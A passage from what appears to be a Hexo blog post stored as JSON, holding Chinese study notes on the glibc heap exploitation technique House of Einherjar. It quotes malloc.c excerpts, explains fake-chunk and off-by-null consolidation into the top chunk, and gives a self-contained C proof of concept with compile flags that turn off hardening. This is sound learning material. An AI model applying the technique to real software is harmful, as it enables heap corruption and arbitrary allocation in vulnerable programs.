fakechunk[6];/*这里，我们通过某种方法伪造了fakechunk。*/\n\tfakechunk[0]=0x100,fakechunk[1]=0x100;\n\tfakechunk[2]=(size_t)fakechunk;\n\tfakechunk[3]=(size_t)fakechunk;\n\tfakechunk[4]=(size_t)fakechunk;\n\tfakechunk[5]=(size_t)fakechunk;\n\tprintf(\"\\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\\033[0m\\n\");\n\tprintf(\"fakechunk的地址(包含chunk头)：%p\\n\",fakechunk);\n\tprintf(\"fd: %#lx\\n\",fakechunk[2]);\n\tprintf(\"bk: %#lx\\n\",fakechunk[3]);\n\tprintf(\"fd_nextsize: %#lx\\n\",fakechunk[4]);\n\tprintf(\"bk_nextsize: %#lx\\n\\n\",fakechunk[5]);\n\t\n\tb=(uint8_t*)malloc(0xf8);/*这就是要触发，向后合并和topchunk合并的堆块.*/\n\tsize_t* b_size_ptr=(size_t*)(b-sizeof(size_t));/*指向 chunk b 的size位.*/\n\tsize_t* b_addr=(size_t *)(b-sizeof(size_t)*2);/*同时也是 chunk b 的prev_size*/\n\tprintf(\"\\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\\033[0m\\n\");\n\tprintf(\"b的地址(含chunk头)： %p\\n\",b_addr);\n\tprintf(\"b的size位：%#lx\\n\\b\",*b_size_ptr);\n\tprintf(\"b的prev_size: %#lx\\n\\n\",*b_addr);\n\t/*\n\t接下来就是修改size和prev_size\n\t这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是\n\t这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。\n\t*/\n\tprintf(\"\\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\\033[0m\\n\");\n\ta[a_size]=0;\n\tprintf(\"修改后b的size位：%#lx\\n\",*b_size_ptr);\n\t\n\t/*\n\t接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,\n\t它应该是从fakechunk到b中间这么大的一块区域\n\t*/\n\tsize_t fakesize=(size_t)((uint8_t *)(b_addr)-(uint8_t *)fakechunk);\n\tprintf(\"b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\\n\",b_addr,fakechunk,fakesize);\n\t*(size_t *)&a[a_size-sizeof(size_t)]=fakesize;\n\tprintf(\"修改后b的prev_size: %#lx\\n\\n\",*b_addr);\n\t/*为了正确的合并，fakechunk的size需要和prev_size对应上*/\n\tfakechunk[1]=fakesize;\n\t/*触发合并*/\n\tfree(b);\n\tprintf(\"合并后fakechunk的size: %#lx\\n\",fakechunk[1]);\n\tprintf(\"是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\\n\");\n\t/*最后看分配到了哪里*/\n\tc=(uint8_t*)malloc(0x200);\n\tsize_t* c_addr=(size_t *)(c-sizeof(size_t)*2);\n\tprintf(\"\\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\\033[0m\\n\");\n\tprintf(\"c的地址(包含chunk头)：%p\\n\",c_addr);\n}\n```\n### 说明\n​\t请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。\n​\t编译时参数(只能在64位下编译)\n```\ngcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro\n```\n​\t这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。\n![image-20250622133210334](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png)\n​\t事实上，也确实如此\n\n### 逐步演示\n#### 创建a堆块\n![image-20250622140529903](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png)\n![image-20250622140615994](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png)\n\n#### 伪造fakechunk\n![image-20250622140854930](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png)\n#### 创建b堆块\n![image-20250622](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png)\n#### 篡改b的size的pre_inuse 位\n![image-20250622141342243](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png)\n#### 篡改b的prev_size \n![image-20250622141504102](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png)\n#### 修改fakechunk的size\n![image-20250622141624553](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png)\n#### free(b)\n![image-20250622143101805](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png)","slug":"heap/House of  Einherjar","published":1,"date":"2025-06-22T12:08:58.263Z","updated":"2025-06-29T19:44:09.280Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ic001guomy1j5k3nai","content":"<h1 id=\"House-of-Einherjar\"><a href=\"#House-of-Einherjar\" class=\"headerlink\" title=\"House of Einherjar\"></a>House of Einherjar</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。<br>​\t从这篇开始，依次做完23个demo的学习文章</p>\n<h2 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h2><p>​\t<strong>也是有源码分析了</strong>文件路径(malloc&#x2F;malloc.c)</p>\n<h3 id=\"consolidate-backward\"><a href=\"#consolidate-backward\" class=\"headerlink\" title=\"consolidate backward\"></a>consolidate backward</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = p-&gt;prev_size;</span><br><span class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      unlink(av, p, bck, fwd);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p-&gt;prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。</p>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> unlink(AV, P, BK, FD) &#123;                                            \\</span></span><br><span class=\"line\"><span class=\"meta\">    FD = P-&gt;fd;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    BK = P-&gt;bk;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        FD-&gt;bk = BK;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        BK-&gt;fd = FD;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"keyword\">if</span> (!in_smallbin_range (P-&gt;size)\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t    <span class=\"keyword\">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \\</span></span><br><span class=\"line\"><span class=\"meta\">\t      malloc_printerr (check_action,\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t       <span class=\"string\">&quot;corrupted double-linked list (not small)&quot;</span>,    \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t       P, AV);\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">            <span class=\"keyword\">if</span> (FD-&gt;fd_nextsize == NULL) &#123;\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                <span class=\"keyword\">if</span> (P-&gt;fd_nextsize == P)\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                  &#125;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">              &#125; <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">              &#125;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">          &#125;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      &#125;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\tunlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。</p>\n<h3 id=\"consolidate-into-top\"><a href=\"#consolidate-into-top\" class=\"headerlink\" title=\"consolidate into top\"></a>consolidate into top</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      size += nextsize;</span><br><span class=\"line\">      set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">      av-&gt;top = p;</span><br><span class=\"line\">      check_chunk(av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。</p>\n<h2 id=\"原理和条件\"><a href=\"#原理和条件\" class=\"headerlink\" title=\"原理和条件\"></a>原理和条件</h2><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>​\t其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。<br>​\t这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。</p>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><p>​\t1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址<br>​\t2.off-by-one 或off-by-null，要能修改pre_inuse。</p>\n<h2 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdin</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* a;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* b;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* c;</span><br><span class=\"line\"></span><br><span class=\"line\">\ta=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x38</span>);<span class=\"comment\">/*假设，我们要利用a去溢出到下一个堆块。*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* a_addr=(<span class=\"type\">size_t</span> *)(a-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"type\">size_t</span>  a_size=malloc_usable_size(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a的地址(包含chunk头)：%p\\n&quot;</span>,a_addr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a的大小(不含chunk头)：%lx\\n\\n&quot;</span>,a_size);</span><br><span class=\"line\">        </span><br><span class=\"line\">\t<span class=\"type\">size_t</span> fakechunk[<span class=\"number\">6</span>];<span class=\"comment\">/*这里，我们通过某种方法伪造了fakechunk。*/</span></span><br><span class=\"line\">\tfakechunk[<span class=\"number\">0</span>]=<span class=\"number\">0x100</span>,fakechunk[<span class=\"number\">1</span>]=<span class=\"number\">0x100</span>;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">2</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">3</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">4</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">5</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fakechunk的地址(包含chunk头)：%p\\n&quot;</span>,fakechunk);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fd: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bk: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fd_nextsize: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">4</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bk_nextsize: %#lx\\n\\n&quot;</span>,fakechunk[<span class=\"number\">5</span>]);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tb=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0xf8</span>);<span class=\"comment\">/*这就是要触发，向后合并和topchunk合并的堆块.*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* b_size_ptr=(<span class=\"type\">size_t</span>*)(b-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));<span class=\"comment\">/*指向 chunk b 的size位.*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* b_addr=(<span class=\"type\">size_t</span> *)(b-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);<span class=\"comment\">/*同时也是 chunk b 的prev_size*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的地址(含chunk头)： %p\\n&quot;</span>,b_addr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的size位：%#lx\\n\\b&quot;</span>,*b_size_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的prev_size: %#lx\\n\\n&quot;</span>,*b_addr);</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t接下来就是修改size和prev_size</span></span><br><span class=\"line\"><span class=\"comment\">\t这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是</span></span><br><span class=\"line\"><span class=\"comment\">\t这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\ta[a_size]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;修改后b的size位：%#lx\\n&quot;</span>,*b_size_ptr);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,</span></span><br><span class=\"line\"><span class=\"comment\">\t它应该是从fakechunk到b中间这么大的一块区域</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> fakesize=(<span class=\"type\">size_t</span>)((<span class=\"type\">uint8_t</span> *)(b_addr)-(<span class=\"type\">uint8_t</span> *)fakechunk);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\\n&quot;</span>,b_addr,fakechunk,fakesize);</span><br><span class=\"line\">\t*(<span class=\"type\">size_t</span> *)&amp;a[a_size-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)]=fakesize;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;修改后b的prev_size: %#lx\\n\\n&quot;</span>,*b_addr);</span><br><span class=\"line\">\t<span class=\"comment\">/*为了正确的合并，fakechunk的size需要和prev_size对应上*/</span></span><br><span class=\"line\">\tfakechunk[<span class=\"number\">1</span>]=fakesize;</span><br><span class=\"line\">\t<span class=\"comment\">/*触发合并*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;合并后fakechunk的size: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">/*最后看分配到了哪里*/</span></span><br><span class=\"line\">\tc=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* c_addr=(<span class=\"type\">size_t</span> *)(c-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;c的地址(包含chunk头)：%p\\n&quot;</span>,c_addr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h3><p>​\t请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。<br>​\t编译时参数(只能在64位下编译)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro</span><br></pre></td></tr></table></figure>\n<p>​\t这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png\" alt=\"image-20250622133210334\"><br>​\t事实上，也确实如此</p>\n<h3 id=\"逐步演示\"><a href=\"#逐步演示\" class=\"headerlink\" title=\"逐步演示\"></a>逐步演示</h3><h4 id=\"创建a堆块\"><a href=\"#创建a堆块\" class=\"headerlink\" title=\"创建a堆块\"></a>创建a堆块</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png\" alt=\"image-20250622140529903\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png\" alt=\"image-20250622140615994\"></p>\n<h4 id=\"伪造fakechunk\"><a href=\"#伪造fakechunk\" class=\"headerlink\" title=\"伪造fakechunk\"></a>伪造fakechunk</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png\" alt=\"image-20250622140854930\"></p>\n<h4 id=\"创建b堆块\"><a href=\"#创建b堆块\" class=\"headerlink\" title=\"创建b堆块\"></a>创建b堆块</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png\" alt=\"image-20250622\"></p>\n<h4 id=\"篡改b的size的pre-inuse-位\"><a href=\"#篡改b的size的pre-inuse-位\" class=\"headerlink\" title=\"篡改b的size的pre_inuse 位\"></a>篡改b的size的pre_inuse 位</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png\" alt=\"image-20250622141342243\"></p>\n<h4 id=\"篡改b的prev-size\"><a href=\"#篡改b的prev-size\" class=\"headerlink\" title=\"篡改b的prev_size\"></a>篡改b的prev_size</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png\" alt=\"image-20250622141504102\"></p>\n<h4 id=\"修改fakechunk的size\"><a href=\"#修改fakechunk的size\" class=\"headerlink\" title=\"修改fakechunk的size\"></a>修改fakechunk的size</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png\" alt=\"image-20250622141624553\"></p>\n<h4 id=\"free-b\"><a href=\"#free-b\" class=\"headerlink\" title=\"free(b)\"></a>free(b)</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png\" alt=\"image-20250622143101805\"></p>\n","excerpt":"","more":"<h1 id=\"House-of-Einherjar\"><a href=\"#House-of-Einherjar\" class=\"headerlink\" title=\"House of Einherjar\"></a>House of Einherjar</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。<br>​\t从这篇开始，依次做完23个demo的学习文章</p>\n<h2 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h2><p>​\t<strong>也是有源码分析了</strong>文件路径(malloc&#x2F;malloc.c)</p>\n<h3 id=\"consolidate-backward\"><a href=\"#consolidate-backward\" class=\"headerlink\" title=\"consolidate backward\"></a>consolidate backward</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">      prevsize = p-&gt;prev_size;</span><br><span 